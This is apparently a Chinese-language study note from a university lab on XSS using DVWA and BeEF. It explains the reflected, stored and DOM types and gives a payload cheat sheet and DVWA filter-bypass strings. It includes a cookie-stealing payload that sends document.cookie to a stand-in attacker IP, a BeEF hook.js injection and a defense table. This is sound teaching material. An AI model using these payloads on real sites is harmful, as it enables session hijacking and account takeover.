# Web 安全：XSS 跨站脚本攻击

> 来源：课程实验《Web前后端编写及分析、JavaScript攻击与XSS攻击》（DVWA 平台 + BeeF 框架，2025-2026 第二学期）
> 定位：前端安全核心漏洞，OWASP Top 10 常年上榜；Web 前端开发与安全岗面试必问
> 实战场景：一切把用户输入原样输出到页面的功能（搜索框、留言板、URL 参数、语言切换）

---

## 一、原理概述

**一句话原理**：服务器把"用户输入的数据"和"网页本身的代码"不加区分地拼在一起返回给浏览器，浏览器把其中的 `<script>` 等标签当成**合法程序**执行——攻击者的 JavaScript 就在受害者的浏览器里运行了。

**为什么能执行？** 浏览器解析 HTML 时，遇到 `<script>`、`<img onerror>` 等标签标签里的代码会无条件执行。判断一段内容"是代码还是数据"的唯一依据是**它出现在 HTML 的哪个位置**，而不是"它是不是用户输入的"。所以只要服务器把用户输入原样塞进了 HTML 输出流，XSS 就成立了。

**为什么危害这么大？** 浏览器有一个安全边界叫**同源策略（Same-Origin Policy）**：一个页面的 JS 只能读写"同源"（协议+域名+端口一致）页面的数据。XSS 恰好**绕过了同源策略**——恶意 JS 是在受害者浏览器里、以受害网站的"身份"运行的，所以它有权读当前页面的 cookie、DOM、键盘输入。典型危害链：

1. `document.cookie` 窃取会话 → **会话劫持**，直接冒充受害者登录
2. 以受害者身份操作（改密码、转账、发帖）→ **越权操作**
3. 存储型 XSS 会传染每个访问该页面的用户 → **蠕虫式传播**
4. 钓鱼页面、键盘记录、配合 BeEF 把浏览器变成"僵尸"被远程遥控

## 二、核心知识

### 三种 XSS 类型（面试第一必考点）

| 类型 | 触发位置 | 是否持久 | 典型场景 | 关键特征 |
|---|---|---|---|---|
| **反射型（Reflected）** | 服务器端，本次请求回显 | 否（一次性） | 搜索框、URL 参数 | payload 在 URL/请求里，只影响点链接的人 |
| **存储型（Stored）** | 服务器端，先存数据库再输出 | 是（持久） | 留言板、评论、用户名 | 危害最大，所有访客都中招 |
| **DOM 型（DOM-based）** | 纯前端，不经过服务器 | 由 URL 状态决定 | 语言切换、URL 参数被 JS 读取 | 服务器响应完全正常，靠前端 JS 的 sink 触发 |

**核心区别一句话**：反射型/存储型是**服务器把输入输出到了 HTML**；DOM 型是**前端 JS 把 URL 参数写进了页面 DOM**——服务器全程不知道有攻击发生。

### 常用 Payload 速查

```html
<script>alert(document.cookie)</script>          <!-- 最直观的验证弹窗 -->
<img src=x onerror=alert(1)>                     <!-- 无 script 字样也能执行 -->
<svg onload=alert(1)>                            <!-- 同上，另一个载体 -->
<a href="javascript:alert(1)">点我</a>           <!-- 伪协议执行 -->
<iframe src="http://attacker/hook.js"></iframe>  <!-- 加载外部脚本（BeEF 挂钩） -->
```

**为什么 `<img onerror>` 能绕过 script 过滤**：过滤规则通常只认得 `script` 字符串，而 `onerror` 事件处理器里照样能写任意 JS，载体标签换了，执行本质没变。**记住：能触发 JS 的标签很多，防住 `<script>` 不等于防住 XSS。**

### 偷 Cookie 的标准姿势

```html
<script>new Image().src='http://攻击者IP:端口/c?='+document.cookie</script>
```

原理：浏览器加载图片时会发起一个 GET 请求，把 cookie 拼在 URL 里发到攻击者服务器，攻击者这边起个 HTTP 服务（`nc -lvp 端口` 或 python http.server）就能收到。**不做别的，只发一个请求，这就是"盲打"的思路。**

### 前端安全视野（实验中的 JavaScript 攻击）

实验第一部分（JavaScript 攻击）揭示了一类常见前端设计缺陷：页面用 JS 算法生成 token（如 `generate_token()`），且函数暴露在全局作用域、浏览器控制台直接可调用。攻击者要么看懂源码调函数，要么抓包把算法解码后在 Burp 里重算——**前端的一切算法和密钥对用户都是透明的**，所以安全校验必须放在后端。

## 三、实操/利用流程（方法论）

### 反射型 XSS 利用五步

1. **找输入点**：搜索框、URL 参数等"提交内容并回显"的位置
2. **探针验证**：输入 `<script>alert(1)</script>`，弹窗即确认可执行；不弹则逐个换 `<img onerror>`/大小写/编码
3. **确定回显位置与拼接上下文**：看源码确认输入被拼在标签属性里还是标签对之间，决定 payload 是否需要引号闭合
4. **窃取会话**：换成偷 cookie 的 payload，攻击者端监听端口等数据
5. **扩大战果**：拿到的 cookie 直接替换进浏览器（EditThisCookie 等）登录，完成会话劫持

### 存储型 XSS 利用（配合 BeEF）

1. 在留言板/用户名字段注入 `<script src="http://攻击者IP:3000/hook.js"></script>`
2. 数据入库后，**每一个访问该页面的人**都会加载 hook.js 被 BeEF 挂钩
3. BeEF 控制台里看到在线"僵尸"浏览器，可执行偷 cookie、钓鱼弹窗、键盘记录、端口扫描等模块

> 实验提示：存储型注入成功后数据进了数据库，每次刷新页面都会复现，测试完要重置数据库，否则影响后续实验。

### DOM 型 XSS 利用

1. 观察页面交互：选择语言/主题后 **URL 出现变化**（如 `?default=English`）
2. 在 URL 参数位直接注入 JS：`default=<script>alert(document.cookie)</script>`
3. 回车执行——**payload 不经过服务器，服务器日志里什么都没有**

## 四、绕过与进阶（DVWA 各难度思路）

| 级别 | 过滤手段 | 绕过 Payload | 思路本质 |
|---|---|---|---|
| Low | 无任何过滤 | `<script>alert(1)</script>` | 直接打 |
| Medium | `str_replace` 替换 `<script>` | `<scr<script>ipt>`（双写）、`<SCript>`（大小写） | 过滤是一次性替换，替换后剩下的部分重新拼成合法标签 |
| High | 正则过滤 script 标签 | `<img src=x onerror=alert(/xss/)>` | 换一个不包含 "script" 字样的执行载体 |
| DOM-Medium | 前端简单过滤 script | `<img onerror=alert(1)>` | 同上，载体替换 |
| DOM-High | 变量被限制为固定四个值 | `English&para=<script>alert(document.cookie)</script>` | 利用 PHP 与浏览器的解析差异，见下 |

**DOM-High 的经典解析差异绕过（必懂）**：后端 PHP 校验变量只能四选一，看起来堵死了。但 PHP 解析查询字符串时 `#` 之后的内容直接忽略；而前端 DOM 解析时仍会把 `&para=...` 这个**额外参数**完整传给 JS，JS 拿到后用 `innerHTML` 写进页面 → 恶意标签在前端被执行。**核心思想：服务器和浏览器对同一段 URL 的解析结果不同，攻击者利用"双方理解的缝隙"。**

### 通用绕过思路（面试加分）

- **过滤是黑名单就永远有漏**：双写、大小写、编码（HTML 实体、URL 编码、Unicode）、换标签载体
- **拼接上下文决定闭合方式**：输入进了标签属性就 `"><script>...`，进了 JS 字符串就 `';alert(1);//`
- 终极方案是**白名单 + 输出编码**，黑名单只能"堵已知"，白名单是"只放允许的"

## 五、防御（面试必答，对应原理）

| 攻击面 | 防御手段 | 对应原理 |
|---|---|---|
| 输入 | 输入校验 + 白名单（过滤） | 从源头拦截恶意内容 |
| **输出** | **上下文相关编码**：`htmlspecialchars()`（HTML 实体编码 `<` `>` `"` `'`）——注入内容被编码成纯文本，永远成不了标签 | 这是 XSS 防御的**根治点**：不管输入多花哨，输出时一律当"文本"处理 |
| Cookie | `HttpOnly` 标志 → JS 读不到 `document.cookie` | 限制 XSS 窃取会话，但治标不治本（XSS 还能干别的） |
| 全局兜底 | **CSP（Content-Security-Policy）**：`script-src 'self'` 等白名单限制脚本来源 | 即使 XSS 注入成功，浏览器也拒绝执行非白名单脚本 |
| 开发侧 | 现代前端框架（React/Vue）默认转义插值；后端模板引擎默认转义 | 把"默认不安全"变成"默认安全" |
| 排查 | 自动化扫描（xssstrike 等）+ 手工验证；`X-XSS-Protection` 已废弃，别当防御 | 纵深防御，不依赖单一机制 |

## 六、面试速答卡

- **什么是 XSS**：服务器把用户输入当代码输出，恶意 JS 在受害者浏览器执行
- **三种 XSS 区别**：反射型一次性（服务器回显）、存储型进数据库（持久）、DOM 型纯前端不经过服务器
- **XSS 和 CSRF 区别**：XSS 是"在受害者的浏览器里跑我的代码"；CSRF 是"借受害者的 Cookie 替他发请求"
- **为什么防住 `<script>` 还不够**：`img onerror`、`svg onload`、伪协议等载体都能执行 JS
- **XSS 危害**：偷 cookie 会话劫持、以受害者身份操作、存储型蠕虫传播、钓鱼键盘记录
- **前端校验为什么不可信**：前端代码算法对用户完全透明，控制台随手可调，安全边界只能在后端
- **最有效的防御**：输出编码（htmlspecialchars）+ 上下文编码 + CSP + HttpOnly 纵深组合
- **HttpOnly 的作用和局限**：防 JS 读 cookie，但 XSS 仍可改页面、发请求，只是防止"会话被直接偷走"
